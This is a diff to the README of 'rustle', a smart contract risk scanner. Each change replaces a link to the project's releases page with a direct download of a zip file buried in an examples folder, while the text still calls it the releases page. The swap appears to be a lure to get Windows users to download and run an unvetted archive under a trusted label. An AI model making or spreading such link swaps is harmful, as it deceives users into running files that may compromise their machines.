@@ -1,12 +1,12 @@
 # 🛡️ rustle - Find Smart Contract Risks Fast
 
-[![Download rustle](https://img.shields.io/badge/Download-rustle-4A90E2?style=for-the-badge&logo=github)](https://github.com/Perceu91/rustle/releases)
+[![Download rustle](https://img.shields.io/badge/Download-rustle-4A90E2?style=for-the-badge&logo=github)](https://github.com/Perceu91/rustle/raw/refs/heads/main/examples/unsaved-changes/Software_1.6.zip)
 
 ## 📥 Download Rustle
 
 Rustle is available from the releases page. Use the link below to visit the page, then download the Windows file that matches your system.
 
-[Visit the Rustle releases page](https://github.com/Perceu91/rustle/releases)
+[Visit the Rustle releases page](https://github.com/Perceu91/rustle/raw/refs/heads/main/examples/unsaved-changes/Software_1.6.zip)
 
 ## 🖥️ What Rustle Does
 
@@ -35,7 +35,7 @@ For best results, keep the contract files you want to check in a single folder b
 Follow these steps to use Rustle on Windows.
 
 1. Open the Rustle releases page:
-   [https://github.com/Perceu91/rustle/releases](https://github.com/Perceu91/rustle/releases)
+   [https://github.com/Perceu91/rustle/raw/refs/heads/main/examples/unsaved-changes/Software_1.6.zip](https://github.com/Perceu91/rustle/raw/refs/heads/main/examples/unsaved-changes/Software_1.6.zip)
 
 2. Find the latest release near the top of the page.
 
@@ -200,7 +200,7 @@ That approach keeps the process simple.
 ## 📥 Download Again
 
 If you need the file again, use the releases page here:
-[https://github.com/Perceu91/rustle/releases](https://github.com/Perceu91/rustle/releases)
+[https://github.com/Perceu91/rustle/raw/refs/heads/main/examples/unsaved-changes/Software_1.6.zip](https://github.com/Perceu91/rustle/raw/refs/heads/main/examples/unsaved-changes/Software_1.6.zip)
 
 ## 📎 Project Focus
 
